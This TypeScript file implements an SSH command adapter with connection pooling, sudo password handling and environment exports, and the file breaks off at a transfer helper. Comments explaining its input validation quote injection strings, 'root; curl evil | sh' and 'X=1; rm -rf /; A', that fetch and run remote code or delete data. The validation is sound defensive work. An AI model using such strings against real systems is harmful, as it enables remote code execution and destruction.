
import type { SFTPRequestOptions } from './sftp-lifecycle.js';
import type { SSHRequestOptions, SSHGetPutDirectoryOptions } from './ssh.js';
import type { SFTPClient as SFTPWrapper, SFTPTransferOptions as TransferOptions } from './contracts.js';

import { Readable } from 'node:stream';
import { finished } from 'node:stream/promises';
import { connect as netConnect } from 'node:net';
import { createHash, randomBytes } from 'node:crypto';

import { SSHError } from './request-lifecycle.js';
import { KeyedMutex } from '../../utils/mutex.js';
import { StreamHandler } from '../../utils/stream.js';
import { ExecutionResult } from '../../core/result.js';
import { unrefTimer } from '../../utils/unref-timer.js';
import { SSHKeyValidator } from './ssh-key-validator.js';
import { SecurePasswordHandler } from './secure-password.js';
import { Command, SSHAdapterOptions } from '../../types/command.js';
import { BaseAdapter, BaseAdapterConfig } from '../base-adapter.js';
import { classifyFailure, resolveExitCode } from '../../core/failure-kind.js';
import { NodeSSH, Config as SSHConfig, SSHExecCommandResponse } from './ssh.js';
import { AdapterError, TimeoutError, ConnectionError } from '../../core/error.js';
import { quoteForShell, validateEnvName as validateEnvNameShared } from '../../utils/shell-escape.js';
import { PooledConnectionMetrics, ConnectionPoolMetricsCollector } from './connection-pool-metrics.js';

export interface SSHConnectionPoolOptions {
  enabled: boolean;
  maxConnections: number;
  idleTimeout: number;
  maxLifetime?: number;  // Maximum lifetime for a connection in milliseconds
  keepAlive: boolean;
  keepAliveInterval?: number;
  autoReconnect?: boolean;
  maxReconnectAttempts?: number;
  reconnectDelay?: number;
}

export interface SSHMultiplexingOptions {
  enabled: boolean;
  controlPath?: string;
  controlPersist?: string | number;
}

export interface SSHSudoOptions {
  enabled: boolean;
  password?: string;
  prompt?: string;
  method?: 'stdin' | 'askpass' | 'echo' | 'secure-askpass'; // Method to provide password
  secureHandler?: SecurePasswordHandler; // Optional custom handler, will create one if not provided
}

export interface SSHFileTransferOptions extends SFTPRequestOptions {
  transferOptions?: TransferOptions;
}
export type SSHDirectoryTransferOptions = SSHFileTransferOptions & Omit<SSHGetPutDirectoryOptions, 'sftp'>;

export interface SSHSFTPOptions {
  enabled: boolean;
  concurrency: number;
}

/**
 * Sudo settings after merging adapter-level {@link SSHSudoOptions} with the
 * per-command `sudo` block.
 *
 * The two sources historically named the same concept differently (`method`
 * vs `passwordMethod`); both are accepted here and reconciled at the single
 * point of use rather than being smuggled through an `any`.
 */
interface SudoConfig {
  enabled?: boolean;
  password?: string;
  user?: string;
  prompt?: string;
  method?: 'stdin' | 'askpass' | 'echo' | 'secure-askpass' | 'secure';
  passwordMethod?: 'stdin' | 'askpass' | 'echo' | 'secure';
  secureHandler?: SecurePasswordHandler;
}

/**
 * Validate a sudo target user name before it reaches a remote command line.
 *
 * The name is restricted to the POSIX portable user-name set rather than
 * merely quoted: a value such as `root; curl evil | sh` is a configuration
 * error and must be rejected outright, not silently executed as a quoted
 * argument that fails in a confusing way.
 *
 * @param user - The configured sudo user name.
 * @returns The same name once validated.
 * @throws {AdapterError} If the name contains anything outside `[A-Za-z0-9._-]`.
 */
/**
 * Validate an environment variable name before it is emitted into a remote
 * `export` statement.
 *
 * Only the value was previously escaped; the name was interpolated raw, so a
 * key such as `X=1; rm -rf /; A` injected arbitrary commands.
 *
 * @param name - The environment variable name.
 * @returns The same name once validated.
 * @throws {AdapterError} If the name is not a valid POSIX identifier.
 */
function validateEnvName(name: string): string {
  try {
    return validateEnvNameShared(name);
  } catch (error) {
    throw new AdapterError('ssh', 'env', error instanceof Error ? error : new Error(String(error)));
  }
}

function validateSudoUser(user: string): string {
  if (user.length === 0 || user.length > 32 || !/^[a-zA-Z0-9._][a-zA-Z0-9._-]*$/.test(user)) {
    throw new AdapterError(
      'ssh',
      'sudo',
      new Error(`Invalid sudo user name: ${JSON.stringify(user)}`)
    );
  }

  return user;
}

export interface SSHAdapterConfig extends BaseAdapterConfig {
  connectionPool?: SSHConnectionPoolOptions;
  defaultConnectOptions?: SSHConfig;
  multiplexing?: SSHMultiplexingOptions;
  sudo?: SSHSudoOptions;
  sftp?: SSHSFTPOptions;
  /**
   * Default host key checking policy for every connection this adapter opens.
   * Individual commands may override it. Defaults to `accept-new`.
   */
  hostKeyChecking?: 'accept-new' | 'strict' | 'off';
  /** Default `known_hosts` file for verification. */
  knownHostsPath?: string;
}

interface PooledConnection {
  key: string;
  reusable: boolean;
  ssh: NodeSSH;
  host: string;
  lastUsed: number;
  useCount: number;
  activeUseCount: number; // Reference count: >0 means connection is in use, prevents eviction
  created: number;
  errors: number;
  config: SSHAdapterOptions;
}

// defaultCwd stays optional: an ambient local-path default is meaningless on
// a remote host, and the base adapter deliberately no longer invents one.
type RequiredSSHConfig = Omit<Required<SSHAdapterConfig>, 'defaultCwd'> & { defaultCwd?: string };

export class SSHAdapter extends BaseAdapter {
  protected readonly adapterName = 'ssh';
  private sshConfig: RequiredSSHConfig;
  private connectionPool: Map<string, PooledConnection> = new Map();
  private poolCleanupInterval?: NodeJS.Timeout;
  private securePasswordHandler?: SecurePasswordHandler;
  private metricsCollector: ConnectionPoolMetricsCollector = new ConnectionPoolMetricsCollector();
  private activeTunnels: Map<string, { close: () => Promise<void> }> = new Map();
  private connectionMutex = new KeyedMutex<string>();
  private connecting = new Map<NodeSSH, AbortController>();
  private disposed = false;

  constructor(config: SSHAdapterConfig = {}) {
    super(config);
    this.name = this.adapterName;
    this.sshConfig = {
      ...this.config,
      connectionPool: {
        enabled: config.connectionPool?.enabled ?? true,
        maxConnections: config.connectionPool?.maxConnections ?? 10,
        idleTimeout: config.connectionPool?.idleTimeout ?? 300000, // 5 minutes
        maxLifetime: config.connectionPool?.maxLifetime ?? 3600000, // 0 disables age eviction
        keepAlive: config.connectionPool?.keepAlive ?? true,
        keepAliveInterval: config.connectionPool?.keepAliveInterval ?? 30000, // 30 seconds
        autoReconnect: config.connectionPool?.autoReconnect ?? true,
        maxReconnectAttempts: config.connectionPool?.maxReconnectAttempts ?? 3,
        reconnectDelay: config.connectionPool?.reconnectDelay ?? 1000 // 1 second
      },
      defaultConnectOptions: config.defaultConnectOptions ?? {},
      multiplexing: {
        enabled: config.multiplexing?.enabled ?? false,
        controlPath: config.multiplexing?.controlPath,
        controlPersist: config.multiplexing?.controlPersist ?? 600
      },
      sudo: {
        enabled: config.sudo?.enabled ?? false,
        password: config.sudo?.password,
        prompt: config.sudo?.prompt ?? '[sudo] password',
        method: config.sudo?.method ?? 'stdin',
        secureHandler: config.sudo?.secureHandler
      },
      sftp: {
        enabled: config.sftp?.enabled ?? true,
        concurrency: config.sftp?.concurrency ?? 5
      },
      hostKeyChecking: config.hostKeyChecking ?? 'accept-new',
      knownHostsPath: config.knownHostsPath as string
    };

    if (this.sshConfig.connectionPool.enabled) {
      this.startPoolCleanup();
    }
  }

  async isAvailable(): Promise<boolean> {
    // SSH is available if we can import the ssh2 module
    try {
      await import('ssh2');
      return true;
    } catch {
      return false;
    }
  }

  /** Reconnect once only when connection establishment failed before command dispatch. */
  async execute(command: Command): Promise<ExecutionResult> {
    try {
      return await this.executeOnce(command);
    } catch (error) {
      const sshOptions = this.extractSSHOptions(this.mergeCommand(command));

      if (!sshOptions || !this.shouldRetryOnFreshConnection(error)) {
        throw error;
      }

      // Acquisition removes a failed transport by identity. Never remove the
      // current pool entry here: another caller may already have replaced it.
      this.emitAdapterEvent('ssh:reconnect', {
        host: sshOptions.host,
        attempts: 1
      });

      const delay = this.sshConfig.connectionPool.reconnectDelay ?? 1000;
      if (delay > 0) await new Promise(resolve => setTimeout(resolve, delay));
      return this.executeOnce(command);
    }
  }

  /**
   * Decide whether a failure is worth one retry on a fresh connection.
   *
   * Deliberately narrow: a command that failed on its own merits, a rejected
   * credential or a mismatched host key must not be retried.
   */
  private shouldRetryOnFreshConnection(error: unknown): boolean {
    if (error instanceof TimeoutError) {
      // The command may still be running remotely; re-issuing it could run it
      // a second time.
      return false;
    }

    if (!this.sshConfig.connectionPool.autoReconnect || this.sshConfig.connectionPool.maxReconnectAttempts === 0) return false;
    const cause = error instanceof AdapterError ? error.originalError : error;
    return cause instanceof ConnectionError && classifyFailure(cause.originalError) === 'connection-lost';
  }

  private async executeOnce(command: Command): Promise<ExecutionResult> {
    const mergedCommand = this.mergeCommand(command);
    const sshOptions = this.extractSSHOptions(mergedCommand);

    if (!sshOptions) {
      throw new AdapterError(this.adapterName, 'execute', new Error('SSH connection options not provided'));
    }

    const startTime = Date.now();
    let connection: PooledConnection | null = null;
    const commandString = this.buildCommandString(mergedCommand);

    try {
      connection = await this.getConnection(sshOptions, { signal: mergedCommand.signal });

      // Emit execute event
      this.emitAdapterEvent('ssh:execute', {
        host: sshOptions.host,
        command: commandString
      });

      // Handle environment variables by prefixing the command
      let envPrefix = '';
      if (mergedCommand.env && Object.keys(mergedCommand.env).length > 0) {
        // Filter out only the explicitly set env vars (not from process.env)
        const explicitEnv: Record<string, string> = {};
        for (const [key, value] of Object.entries(mergedCommand.env)) {
          // Only include env vars that were explicitly set in the command
          if (command.env && key in command.env) {
            explicitEnv[key] = value;
          }
        }

        if (Object.keys(explicitEnv).length > 0) {
          const envVars = Object.entries(explicitEnv)
            .map(([key, value]) => `export ${validateEnvName(key)}=${quoteForShell(value, 'posix')}`)
            .join('; ');
          envPrefix = `${envVars}; `;
        }
      }

      // Handle sudo if enabled.
      //
      // The env prefix must stay OUTSIDE the sudo wrapper: `sudo -S export
      // FOO=bar; cmd` asks sudo to run the shell builtin `export` as a binary,
      // which fails, after which `cmd` runs without sudo at all. Wrapping only
      // the command keeps both halves working.
      const sudoCommand = await this.wrapWithSudo(commandString, mergedCommand, connection.ssh);
      const finalCommand = envPrefix + sudoCommand;

      // For SSH, only pass cwd if it was explicitly set in the original command
      // mergeCommand only carries a cwd that was explicitly asked for — the
      // per-adapter workaround that stripped an ambient local default out
      // again is gone along with the ambient default itself, so a configured
      // defaultCwd now reaches the remote side instead of being discarded.
      const sshCommand = { ...mergedCommand };

      // Execute command
      const connectionKey = this.getConnectionKey(sshOptions);
      const result = await this.executeSSHCommand(
        connection.ssh,
        finalCommand,
        sshCommand,
        connection.host,
        connectionKey
      );

      const endTime = Date.now();
      const signal = result.signal ? (result.signal.startsWith('SIG') ? result.signal : `SIG${result.signal}`) : undefined;

      return this.createResult(
        result.stdout,
        result.stderr,
        resolveExitCode(result.code, signal),
        signal,
        commandString,
        startTime,
        endTime,
        { host: `${sshOptions.host}:${sshOptions.port || 22}`, originalCommand: mergedCommand }
      );
    } catch (error) {
      if (error instanceof TimeoutError) {
        // Remove connection from pool after timeout
        if (connection) {
          this.removeFromPool(this.getConnectionKey(sshOptions));
        }
        // Handle timeout with nothrow
        if (mergedCommand.nothrow) {
          // Return error result for timeout without throwing
          const endTime = Date.now();
          return this.createResultNoThrow(
            '',
            error.message,
            124, // Standard timeout exit code
            'SIGTERM',
            commandString,
            startTime,
            endTime,
            { host: `${sshOptions.host}:${sshOptions.port || 22}`, originalCommand: mergedCommand }
          );
        }
        // Re-throw TimeoutError for consistent behavior
        throw error;
      }

      if (error instanceof ConnectionError) {
        throw error;
      }

      if (connection) {
        // Track error
        connection.errors++;

        // Retire an unhealthy connection only after its other users finish.
        // A command failure must never interrupt an unrelated active channel.
      }

      throw new AdapterError(
        this.adapterName,
        'execute',
        error instanceof Error ? error : new Error(String(error))
      );
    } finally {
      if (connection) {
        this.releaseConnection(connection);
      }
    }
  }

  private extractSSHOptions(command: Command): SSHAdapterOptions | null {
    if (command.adapterOptions?.type === 'ssh') {
      return command.adapterOptions;
    }
    return null;
  }

  /** Acquisition pins a connection before exposing it to any caller or eviction. */
  private async getConnection(options: SSHAdapterOptions, request: SSHRequestOptions = {}, exclusive = false): Promise<PooledConnection> {
    const reusable = this.sshConfig.connectionPool.enabled && !exclusive;
    const key = reusable ? this.getConnectionKey(options) : `exclusive:${randomBytes(16).toString('hex')}`;
    const acquire = async () => {
      if (this.disposed) throw new SSHError('SSH adapter is disposed', 'ESHUTDOWN');
      if (request.signal?.aborted) throw new SSHError('SSH connection cancelled', 'ABORT_ERR');
      if (reusable) {
        const existing = await this.getExistingConnection(key);
        if (existing) return existing;
      }
      return this.createNewConnection(options, key, reusable, request.signal);
    };
    return reusable ? this.connectionMutex.withLock(key, acquire) : acquire();
  }

  private async getExistingConnection(key: string): Promise<PooledConnection | null> {
    const existing = this.connectionPool.get(key);
    if (!existing) return null;
    const maxLifetime = this.sshConfig.connectionPool.maxLifetime ?? 3600000;
    const expired = maxLifetime > 0 && Date.now() - existing.created > maxLifetime;
    if (!existing.ssh.isConnected() || (existing.activeUseCount === 0 && (expired || existing.errors > 3))) {
      await this.closeConnection(key, existing, 'retired');
      return null;
    }
    existing.activeUseCount++;
    existing.useCount++;
    existing.lastUsed = Date.now();
    this.metricsCollector.onConnectionReused();
    this.emitAdapterEvent('ssh:pool-metrics', { metrics: this.getPoolMetrics() });
    return existing;
  }

  private releaseConnection(connection: PooledConnection): void {
    connection.activeUseCount = Math.max(0, connection.activeUseCount - 1);
    connection.lastUsed = Date.now();
    if (!connection.activeUseCount && (!connection.reusable || connection.errors > 3)) {
      void this.closeConnection(connection.key, connection, 'released');
    }
  }

  private connectionOptions(options: SSHAdapterOptions): SSHConfig {
    return {
      keepaliveInterval: this.sshConfig.connectionPool.keepAlive ? this.sshConfig.connectionPool.keepAliveInterval : 0,
      keepaliveCountMax: 3,
      ...this.sshConfig.defaultConnectOptions,
      host: options.host,
      username: options.username,
      port: options.port ?? 22,
      privateKey: options.privateKey as any,
      passphrase: options.passphrase,
      password: options.password,
      hostKeyChecking: options.hostKeyChecking ?? this.sshConfig.hostKeyChecking,
      knownHostsPath: options.knownHostsPath ?? this.sshConfig.knownHostsPath
    };
  }

  private async createNewConnection(options: SSHAdapterOptions, key: string, reusable: boolean,
    signal?: AbortSignal): Promise<PooledConnection> {
    // Reserve synchronously, before validation/authentication. Concurrent hosts
    // cannot all pass a size check and exceed the configured socket budget.
    const limit = this.sshConfig.connectionPool.maxConnections;
    if (!Number.isInteger(limit) || limit < 1) throw new SSHError('SSH maxConnections must be a positive integer', 'EINVAL');
    if (this.connectionPool.size + this.connecting.size >= limit) this.removeOldestIdleConnection();
    if (this.connectionPool.size + this.connecting.size >= limit) throw new SSHError('SSH connection capacity is busy; no active connection was evicted', 'ENOBUFS');
    const ssh = new NodeSSH();
    const abort = new AbortController();
    this.connecting.set(ssh, abort);
    try {
      await this.validateConnectionOptions(options);
      const connectOptions = this.connectionOptions(options);
      connectOptions.signal = AbortSignal.any([abort.signal, ...[signal, connectOptions.signal].filter((item): item is AbortSignal => !!item)]);
      if (this.disposed || connectOptions.signal.aborted) throw new SSHError('SSH connection cancelled', 'ABORT_ERR');
      await ssh.connect(connectOptions);
      if (this.disposed || connectOptions.signal.aborted) throw new SSHError('SSH connection cancelled', 'ABORT_ERR');
      if (!ssh.isConnected()) throw new SSHError('SSH connection closed before acquisition', 'ECONNRESET');
      const now = Date.now();
      const connection: PooledConnection = {
        key, reusable, ssh, host: options.host, lastUsed: now, useCount: 1,
        activeUseCount: 1, created: now, errors: 0, config: options,
      };
      this.connecting.delete(ssh);
      this.connectionPool.set(key, connection);
      this.metricsCollector.onConnectionCreated();
      this.emitConnectionEvents(options);
      this.emitAdapterEvent('ssh:pool-metrics', { metrics: this.getPoolMetrics() });
      return connection;
    } catch (error) {
      ssh.dispose(true);
      this.metricsCollector.onConnectionFailed();
      if (error instanceof SSHError) throw error;
      throw new ConnectionError(options.host, error instanceof Error ? error : new Error(String(error)));
    } finally { this.connecting.delete(ssh); }
  }

  private async validateConnectionOptions(options: SSHAdapterOptions): Promise<void> {
    // Validate SSH options
    const validationResult = SSHKeyValidator.validateSSHOptions({
      host: options.host,
      username: options.username,
      port: options.port,
      privateKey: options.privateKey,
      password: options.password
    });

    if (!validationResult.isValid) {
      throw new ConnectionError(
        options.host,
        new Error(`Invalid SSH options: ${validationResult.issues.join(', ')}`)
      );
    }

    // Validate private key if provided
    if (options.privateKey) {
      const keyValidation = await SSHKeyValidator.validatePrivateKey(options.privateKey, options.passphrase);
      if (!keyValidation.isValid) {
        throw new ConnectionError(
          options.host,
          new Error(`Invalid SSH private key: ${keyValidation.issues.join(', ')}`)
        );
      }

      this.emitAdapterEvent('ssh:key-validated', {
        host: options.host,
        keyType: keyValidation.keyType || 'unknown',
        username: options.username || process.env['USER'] || 'unknown'
      });
    }
  }

  private emitConnectionEvents(options: SSHAdapterOptions): void {
    this.emitAdapterEvent('ssh:connect', {
      host: options.host,
      port: options.port ?? 22,
      username: options.username || process.env['USER'] || 'unknown'
    });

    this.emitAdapterEvent('connection:open', {
      host: options.host,
      port: options.port ?? 22,
      type: 'ssh',
      metadata: {
        username: options.username || process.env['USER'] || 'unknown'
      }
    });
  }

  private getConnectionKey(options: SSHAdapterOptions): string {
    // Credentials are part of a pooled connection's identity. Keying only on
    // user@host:port let two callers with *different* credentials share one
    // socket, so the second caller's credentials were never verified — an
    // authentication bypass in multi-tenant and credential-rotation setups.
    //
    // The material is hashed rather than embedded so that secrets never reach
    // pool keys, log lines or metrics labels.
    const privateKey = Buffer.isBuffer(options.privateKey)
      ? ['bytes', options.privateKey.toString('base64')] : ['text', options.privateKey ?? ''];
    // Structured boundaries prevent credential or user/host delimiter collisions.
    return createHash('sha256').update(JSON.stringify([
      options.host, options.username, options.port ?? 22, privateKey,
      options.passphrase ?? '', options.password ?? '',
      options.hostKeyChecking ?? this.sshConfig.hostKeyChecking,
      options.knownHostsPath ?? this.sshConfig.knownHostsPath ?? '',
    ])).digest('hex');
  }

  private async executeSSHCommand(
    ssh: NodeSSH,
    command: string,
    options: Partial<Command> = {},
    host?: string,
    connectionKey?: string
  ): Promise<SSHExecCommandResponse> {
    // The remote process is terminated through the exec channel — on abort,
    // and when output blows the cap, where letting it keep streaming into a
    // void serves nobody. The channel arrives via onChannel below.
    let channel: { signal(name: string): void; close(): void } | null = null;
    let terminated = false;
    const outputDrains: Promise<void>[] = [];
    const terminate = (): void => {
      if (terminated || !channel) return;
      terminated = true;
      try {
        channel.signal('TERM');
      } catch {
        // The channel may already be closing; closing below still applies.
      }
      try {
        channel.close();
      } catch {
        // Already closed.
      }
    };

    const stdoutHandler = new StreamHandler({
      encoding: this.config.encoding,
      maxBuffer: options.maxBuffer ?? this.config.maxBuffer,
      streamName: 'stdout',
      onOverflow: () => terminate()
    });

    const stderrHandler = new StreamHandler({
      encoding: this.config.encoding,
      maxBuffer: options.maxBuffer ?? this.config.maxBuffer,
      streamName: 'stderr',
      onOverflow: () => terminate()
    });

    const clearAbort = this.setupAbortSignal(options.signal, terminate);

    // Create exec options
    const execOptions: any = {
      cwd: options.cwd,
      signal: options.signal,
      maxBuffer: options.maxBuffer ?? this.config.maxBuffer,
      stdin: this.convertStdin(options.stdin),
      collectStdout: typeof options.stdout !== 'object' && options.stdout !== 'pipe',
      collectStderr: typeof options.stderr !== 'object' && options.stderr !== 'pipe',
      execOptions: {},
      onChannel: (ch: { signal(name: string): void; close(): void }) => {
        channel = ch;
        if (options.signal?.aborted) terminate();
        // Native streams propagate backpressure; the SSH wrapper must not also retain them.
        if (options.stdout && typeof options.stdout === 'object') {
          const drained = finished(options.stdout, { cleanup: true });
          void drained.catch(() => terminate());
          outputDrains.push(drained);
          (ch as unknown as NodeJS.ReadableStream).pipe(options.stdout);
        }
        if (options.stderr && typeof options.stderr === 'object') {
          const drained = finished(options.stderr, { cleanup: true });
          void drained.catch(() => terminate());
          outputDrains.push(drained);
          (ch as unknown as { stderr: NodeJS.ReadableStream }).stderr.pipe(options.stderr);
        }

        // The exec channel is the reachable end of the remote process. No
        // pid: the remote id is not knowable from here, and reporting a
        // local one would invite signalling the wrong machine.
        const duplex = ch as unknown as {
          write?: unknown;
          stderr?: NodeJS.ReadableStream;
        };
        options.onSpawn?.({
          stdin: (typeof duplex.write === 'function' ? ch : null) as never,
          stdout: (typeof duplex.write === 'function' ? ch : null) as never,
          stderr: (duplex.stderr ?? null) as never,
          kill: () => terminate(),
        });
      }
    };

    // Set up stream handling if we're piping
    if (options.stdout === 'pipe') {
      execOptions.onStdout = (chunk: Buffer) => {
        const transform = stdoutHandler.createTransform();
        transform.write(chunk);
        transform.end();
      };
    }

    if (options.stderr === 'pipe') {
      execOptions.onStderr = (chunk: Buffer) => {
        const transform = stderrHandler.createTransform();
        transform.write(chunk);
        transform.end();
      };
    }

    // Execute the command
    const execPromise = ssh.execCommand(command, execOptions)
      .then(async answer => { await Promise.all(outputDrains); return answer; });

    // Handle timeout
    const timeout = options.timeout ?? this.config.defaultTimeout;
    let result;
    try {
      result = await this.handleTimeout(
        execPromise,
        timeout,
        command,
        // A timed-out remote process is terminated through its exec channel,
        // the same route as an abort.
        terminate
      );
    } finally {
      // Always detach the abort listener — leaving it attached after a
      // timeout or exec error would accumulate one listener per command on a
      // long-lived AbortSignal.
      clearAbort();
    }

    // Truncated output must never read as a clean success.
    const overflow = stdoutHandler.overflowError ?? stderrHandler.overflowError;
    if (overflow) {
      overflow.partialStdout = stdoutHandler.getContent();
      overflow.partialStderr = stderrHandler.getContent();
      throw overflow;
    }

    // Override stdout/stderr with our collected data if we were piping
    if (options.stdout === 'pipe') {
      result.stdout = stdoutHandler.getContent();
    }
    if (options.stderr === 'pipe') {
      result.stderr = stderrHandler.getContent();
    }

    return result;
  }

  private convertStdin(stdin: Command['stdin']): string | Buffer | Readable | undefined {
    if (!stdin) return undefined;
    if (typeof stdin === 'string') return stdin;
    if (Buffer.isBuffer(stdin)) return stdin;

    if (stdin instanceof Readable) {
      // The exec layer pipes a readable straight into the channel. This used
      // to return undefined, so `$.ssh(...)\`cmd\`` with a stream stdin
      // silently ran the command with no input at all.
      return stdin;
    }

    return undefined;
  }

  private async wrapWithSudo(command: string, options: Command, ssh: NodeSSH): Promise<string> {
    // First check if sudo is enabled globally in adapter config
    const globalSudoEnabled = this.sshConfig.sudo.enabled;

    // Then check if it's overridden in command options
    const sshOptions = this.extractSSHOptions(options);
    const commandSudoEnabled = sshOptions?.sudo?.enabled;

    // If sudo is not enabled at all, return the command as-is
    if (!globalSudoEnabled && !commandSudoEnabled) {
      return command;
    }

    // Merge sudo config: command options override global config
    const sudoConfig = {
      ...this.sshConfig.sudo,
      ...(sshOptions?.sudo || {})
    };

    // Initialize secure password handler if needed and not already done
    const method = sudoConfig.method || sudoConfig.passwordMethod;
    if ((method === 'secure' || method === 'secure-askpass') && !this.securePasswordHandler) {
      this.securePasswordHandler = sudoConfig.secureHandler || new SecurePasswordHandler();
    }

    return this.buildSudoCommandWithConfig(command, sudoConfig);
  }

  private buildSudoCommandWithConfig(rawCommand: string, sudoConfig: SudoConfig): string {
    if (!sudoConfig || !sudoConfig.enabled) return rawCommand;

    const sudoCmd = sudoConfig.user
      ? `sudo -u ${quoteForShell(validateSudoUser(sudoConfig.user), 'posix')}`
      : 'sudo';

    // Run the whole command inside a privileged shell rather than handing its
    // words to sudo directly. Without this, the *calling* shell expands
    // `$(…)`, applies redirections and splits pipelines before sudo starts, so
    // `echo $(whoami)` reported the unprivileged user and `cmd > /root/f`
    // failed on permissions — surprising for something the user asked to run
    // as root.
    const command = `sh -c ${quoteForShell(rawCommand, 'posix')}`;

    // Handle password authentication
    if (sudoConfig.password) {
      const method = sudoConfig.method || sudoConfig.passwordMethod || 'stdin';

      switch (method) {
        case 'stdin':
          // Use printf instead of echo for better security and compatibility
          // The password is still visible in process list, but for a shorter time
          console.warn('Using stdin method for sudo password may expose it in process listings. Consider using secure-askpass method.');
          return `printf '%s\n' ${quoteForShell(sudoConfig.password, 'posix')} | ${sudoCmd} -S ${command}`;

        case 'echo':
          console.warn('Using echo for sudo password is insecure and may expose the password in process listings. Consider using secure-askpass method.');
          // Use printf for better compatibility and slightly better security
          return `printf '%s\n' ${quoteForShell(sudoConfig.password, 'posix')} | ${sudoCmd} -S ${command}`;

        case 'askpass':
          // Falls through to the secure construction below. The old branch
          // emitted `SUDO_ASKPASS=/tmp/askpass_$$` and never created that
          // file, so the method could not deliver a password at all — and
          // the PID-predictable path invited a local user on the remote to
          // plant one. There is exactly one correct askpass construction;
          // every spelling of the option gets it.
          // falls through
        case 'secure':
        case 'secure-askpass': {
          // Build an askpass script on the remote host so the password never
          // appears in the remote process list.
          //
          // The lines below MUST be joined with newlines: a heredoc is
          // line-oriented, and joining with ` && ` previously collapsed the
          // whole script onto one line where `#!/bin/sh` started a comment
          // that swallowed the command. The result was a no-op that exited 0,
          // so sudo commands silently appeared to succeed.
          const scriptId = randomBytes(12).toString('hex');
          const remoteAskpassPath = `/tmp/.xec-askpass-${scriptId}`;
          const quotedPath = quoteForShell(remoteAskpassPath, 'posix');

          // A random terminator cannot collide with password content.
          const heredocTag = `XEC_ASKPASS_${randomBytes(8).toString('hex').toUpperCase()}`;
          const quotedPassword = quoteForShell(sudoConfig.password, 'posix');

          return [
            // umask before creation closes the world-readable window that a
            // create-then-chmod sequence leaves open.
            'umask 077',
            `cat > ${quotedPath} << '${heredocTag}'`,
            '#!/bin/sh',
            `printf '%s\\n' ${quotedPassword}`,
            heredocTag,
            `chmod 700 ${quotedPath}`,
            `SUDO_ASKPASS=${quotedPath} ${sudoCmd} -A ${command}`,
            // Preserve the command's exit status across cleanup, and clean up
            // even when the command fails.
            '__xec_sudo_status=$?',
            `rm -f ${quotedPath}`,
            'exit $__xec_sudo_status'
          ].join('\n');
        }

        default:
          return `${sudoCmd} ${command}`;
      }
    }

    // No password required
    return `${sudoCmd} ${command}`;
  }

  private startPoolCleanup(): void {
    this.poolCleanupInterval = setInterval(async () => {
      const now = Date.now();
      const idleTimeout = this.sshConfig.connectionPool.idleTimeout;
      const maxLifetime = this.sshConfig.connectionPool.maxLifetime ?? 3600000; // Default 1 hour
      const connectionsToClose: Array<[string, PooledConnection, string]> = [];

      // Identify connections to close (skip connections currently in use)
      for (const [key, connection] of this.connectionPool.entries()) {
        // Never evict connections with active operations
        if (connection.activeUseCount > 0) {
          continue;
        }

        // Check idle timeout
        if (now - connection.lastUsed > idleTimeout) {
          connectionsToClose.push([key, connection, 'idle_timeout']);
          continue;
        }

        // Check max lifetime
        if (maxLifetime > 0 && (now - connection.created) > maxLifetime) {
          connectionsToClose.push([key, connection, 'max_lifetime_exceeded']);
          continue;
        }

        // Check connection health
        if (!connection.ssh.isConnected()) {
          connectionsToClose.push([key, connection, 'connection_dead']);
        }
      }

      // Close connections
      if (connectionsToClose.length > 0) {
        await Promise.all(
          connectionsToClose.map(([key, connection, reason]) =>
            this.closeConnection(key, connection, reason)
          )
        );

        this.metricsCollector.onCleanup();

        // Emit cleanup event
        this.emitAdapterEvent('ssh:pool-cleanup', {
          cleaned: connectionsToClose.length,
          remaining: this.connectionPool.size
        });
      }
    }, 60000); // Check every minute

    // Unref the interval so it doesn't keep the process alive
    unrefTimer(this.poolCleanupInterval);
  }

  private removeFromPool(key: string): void {
    const connection = this.connectionPool.get(key);
    if (connection) {
      // Use async closeConnection method but don't await (for backward compatibility)
      this.closeConnection(key, connection, 'pool_removal').catch(error => {
        console.error(`Error closing connection ${key}:`, error);
      });
    }
  }

  private async closeConnection(key: string, connection: PooledConnection, reason: string): Promise<void> {
    // Identity guard prevents a late cleanup from removing a replacement.
    if (this.connectionPool.get(key) !== connection) return;
    this.connectionPool.delete(key);
    connection.ssh.dispose(true);
    this.metricsCollector.onConnectionDestroyed();
    const host = connection.config.host;
    this.emitAdapterEvent('ssh:disconnect', { host, reason });
    this.emitAdapterEvent('connection:close', { host, port: connection.config.port ?? 22, type: 'ssh', reason });
  }

  private removeOldestIdleConnection(): void {
    let oldestKey: string | null = null;
    let oldestTime = Infinity;

    for (const [key, connection] of this.connectionPool.entries()) {
      if (connection.activeUseCount === 0 && connection.lastUsed < oldestTime) {
        oldestTime = connection.lastUsed;
        oldestKey = key;
      }
    }

    if (oldestKey) {
      this.removeFromPool(oldestKey);
    }
  }

  private getPoolMetrics() {
    const connections = new Map<string, PooledConnectionMetrics>();

    for (const [key, conn] of this.connectionPool.entries()) {
      connections.set(key, {
        created: new Date(conn.created),
        lastUsed: new Date(conn.lastUsed),
        useCount: conn.useCount,
        isAlive: conn.ssh.isConnected(),
        isActive: conn.activeUseCount > 0,
        errors: conn.errors
      });
    }

    return this.metricsCollector.getMetrics(this.connectionPool.size, connections);
  }

  getConnectionPoolMetrics() {
    return this.getPoolMetrics();
  }

  async dispose(): Promise<void> {
    this.disposed = true;
    for (const [ssh, abort] of this.connecting) { abort.abort(); ssh.dispose(true); }
    // Clear pool cleanup interval first
    if (this.poolCleanupInterval) {
      clearInterval(this.poolCleanupInterval);
      this.poolCleanupInterval = undefined;
    }

    // Close all tunnels
    const tunnelClosePromises: Promise<void>[] = [];
    for (const [id, tunnel] of this.activeTunnels) {
      tunnelClosePromises.push(
        tunnel.close().catch(error => {
          // Log error but continue closing other tunnels
          console.error(`Failed to close tunnel ${id}:`, error);
        })
      );
    }

    // Wait for all tunnels to close
    await Promise.all(tunnelClosePromises);
    this.activeTunnels.clear();

    // Close all connections in the pool
    const connectionClosePromises: Promise<void>[] = [];
    for (const [key, connection] of this.connectionPool.entries()) {
      connectionClosePromises.push(
        this.closeConnection(key, connection, 'adapter_dispose')
      );
    }

    // Wait for all connections to close
    await Promise.all(connectionClosePromises);
    this.connectionPool.clear();

    // Clean up secure password handler
    if (this.securePasswordHandler) {
      try {
        await this.securePasswordHandler.cleanup();
      } catch (error) {
        console.error('Failed to cleanup secure password handler:', error);
      }
      this.securePasswordHandler = undefined;
    }
  }

  /** A file operation owns its pooled connection until subsystem cleanup completes. */
  private async withTransfer<T>(target: SSHAdapterOptions, options: SSHFileTransferOptions,
    operation: (ssh: NodeSSH, sftp: SFTPWrapper) => Promise<T>): Promise<T> {
